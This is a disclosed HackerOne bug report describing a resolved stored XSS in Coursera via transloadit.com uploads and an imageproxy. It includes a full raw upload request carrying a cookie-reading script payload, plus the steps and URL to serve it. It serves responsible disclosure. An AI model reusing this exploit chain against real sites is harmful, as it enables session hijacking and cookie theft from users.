---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2017-11-30
submitted: 2017-03-28T22:32:00.312Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/coursera|Coursera]]"
reporter: "c0rdis"
source: "https://hackerone.com/reports/216822"
title: "Stored XSS via transloadit.com and imageproxy"
---
# Stored XSS via transloadit.com and imageproxy

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Coursera | **Disclosed:** 2017-11-30

- Report: [https://hackerone.com/reports/216822](https://hackerone.com/reports/216822)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-03-28T22:32:00.312Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,
due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com. From there, since imageproxy trusts coursera-profile-photos.s3.amazonaws.com, one can fetch arbitrary content and, in case of javascript, get it executed in the browser. 

Steps to reproduce:

1) Let's send html file with trivial XSS vector to transloadit.com. Please note that no authentication is required.
POST /assemblies/[hash]?redirect=false HTTP/1.1
Host: isadora.transloadit.com
Referer: https://api.coursera.org/account/profile
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880
Content-Length: 521

-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="params"

{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001845
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html

<html>
<script>
alert(document.cookie);
</script>
</html>
-----------------------------185739484714145007371896001845--

2) By accessing https://isadora.transloadit.com/assemblies/[hash]?seq=0&callback=, we can learn the URL of the uploaded malicious file (in this case it's http://coursera-profile-photos.s3.amazonaws.com██████████stored_xss.html)

3) Since it's already trusted, we could use it to upload as the profile photo, or to fetch via imageproxy as mentioned above. Final URL: https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com█████stored_xss.html

Please find the screenshot attached.
AA

## Timeline

- **Report Filed**
- **Report Triaged**
- **2017-04-11** @jkostyukova: Thanks for the report!
- **2017-05-25** @c0rdis: No problem. Any updates?
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
